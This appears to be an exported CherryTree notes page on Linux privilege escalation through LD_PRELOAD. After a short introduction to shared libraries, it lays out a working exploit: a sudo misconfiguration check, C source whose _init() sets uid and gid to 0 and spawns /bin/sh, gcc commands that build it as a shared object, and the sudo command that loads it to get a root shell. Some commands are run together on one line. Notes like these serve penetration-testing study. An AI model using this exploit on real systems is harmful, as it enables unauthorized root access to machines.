<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>LD_PRELOAD</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>LD_PRELOAD</h1><br/><p><h1>Introduction</h1></p><p><ul><li>shared libraries:<ul><li>libraries that are loaded by programs when they start. </li><li>Every shared library has a special name called the &quot;soname”. The soname has the prefix &quot;lib”, the name of the library, the phrase `”.so”, followed by a period and a version number.</li></ul></li><li>LD_<span style="text-decoration:underline;">PRELOAD</span><ul><li>Environment variable that lists shared libraries with functions that override the standard set, just as /etc/ld.so.preload does</li></ul></li></ul></p><p></p><p></p><p></p><p><h1>Exploit</h1></p><p><ul><li>prerequs<ul><li>sudo -l =&gt;<ul><li>raj  ALL=(ALL:ALL) NOPASSWD: /usr/bin/find</li><li>Defaults        env_keep += LD_PRELOAD // env_reset</li></ul></li><li>nano /tmp/shell.c<ul><li><h3>#include &lt;stdio.h&gt; #include &lt;sys/types.h&gt; #include &lt;stdlib.h&gt; void _init() { unsetenv(&quot;LD_PRELOAD&quot;); setgid(0); setuid(0); system(&quot;/bin/sh&quot;); }</h3></li></ul></li><li>compile to a library<ul><li><h3>gcc -fPIC -shared -o shell.so shell.c -nostartfiles ls -al shell.so sudo LD_PRELOAD=/tmp/shell.so find id whoami</h3></li></ul></li><li>exploit<ul><li>sudo LD_PRELOAD=/tmp/shell.so find </li></ul></li></ul></li></ul></p><p></p><p></p><p>sudo -l </p></div>
</body>
</html>
